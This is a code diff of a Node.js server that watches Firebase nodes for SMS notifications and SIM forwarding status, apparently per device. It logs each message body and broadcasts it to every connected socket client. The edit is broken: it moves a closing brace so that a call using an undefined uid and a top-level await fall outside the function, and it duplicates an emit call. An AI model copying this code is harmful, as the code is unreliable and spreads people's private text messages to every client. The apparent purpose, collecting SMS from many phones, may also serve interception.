@@ -537,8 +537,8 @@ app.get("/api/lastcheck/:uid", async (req, res) => {
       LIVE WATCHERS: SMS STATUS + SIM FORWARD STATUS
 ====================================================== */
 
-const smsStatusRef = rtdb.ref("smsStatus");   // ⭐ FIXED: define first
-const lastStatusCache = {};                   // ⭐ status cache
+const smsStatusRef = rtdb.ref("smsStatus");  
+const lastStatusCache = {};                  
 
 function normalizeSmsStatusSnap(snap) {
   if (!snap.exists()) return null;
@@ -710,6 +710,10 @@ async function handleSmsNotificationsBranch(snap, event = "update") {
 
   smsCache[uid] = messages; // update cache
 
+  // Send PER-DEVICE LIST (still needed)
+  emitSmsDeviceLive(uid, messages, event);
+
+  // ⭐ NEW FIX: Only send incremental update
   if (changedMsgId) {
     const sms = messages[changedMsgId];
 
@@ -722,14 +726,23 @@ async function handleSmsNotificationsBranch(snap, event = "update") {
     console.log(`🕒 Timestamp: ${sms.timestamp}`);
     console.log(`✉️ Message: ${sms.body}`);
     console.log("=======================================\n\n");
+
+    io.emit("smsLogsNew", {
+      success: true,
+      uniqueid: uid,
+      id: changedMsgId,
+      data: sms,
+      event,
+    });
   }
+}
+
 
   // Emit per-device live list
   emitSmsDeviceLive(uid, messages, event);
 
-  // Also refresh ALL-SMS list
-  await refreshSmsAllLive(`sms_${event}:${uid}`);
-}
+await refreshSmsAllLive(`sms_${event}:${uid}`);
+
 
 smsNotificationsRef.on("child_added", (snap) =>
   handleSmsNotificationsBranch(snap, "added")
